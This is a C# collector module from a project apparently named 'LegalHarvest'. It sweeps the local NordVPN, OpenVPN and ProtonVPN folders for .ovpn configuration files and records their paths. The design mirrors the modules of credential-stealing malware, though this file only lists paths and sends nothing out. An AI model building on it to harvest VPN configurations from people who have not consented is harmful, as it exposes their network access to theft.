using System;
using System.Collections.Generic;
using System.IO;

namespace LegalHarvest.Modules
{
    public class VPNClientsModule : ICollectorModule
    {
        public string ModuleName => "VPNClients";
        public bool CanExecute() => true;

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            // NordVPN
            string nordDir = Path.Combine(localAppData, "NordVPN");
            if (Directory.Exists(nordDir))
                foreach (string file in Directory.GetFiles(nordDir, "*.ovpn", SearchOption.AllDirectories))
                    items.Add(new CollectedItem { Category = "NordVPN", Name = file, Value = file, Timestamp = DateTime.Now });

            // OpenVPN
            string openvpnConfig = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "OpenVPN", "config");
            if (Directory.Exists(openvpnConfig))
                foreach (string file in Directory.GetFiles(openvpnConfig, "*.ovpn"))
                    items.Add(new CollectedItem { Category = "OpenVPN", Name = file, Value = file, Timestamp = DateTime.Now });

            // ProtonVPN
            string protonDir = Path.Combine(localAppData, "ProtonVPN");
            if (Directory.Exists(protonDir))
                foreach (string file in Directory.GetFiles(protonDir, "*.ovpn", SearchOption.AllDirectories))
                    items.Add(new CollectedItem { Category = "ProtonVPN", Name = file, Value = file, Timestamp = DateTime.Now });

            return items;
        }
    }
}
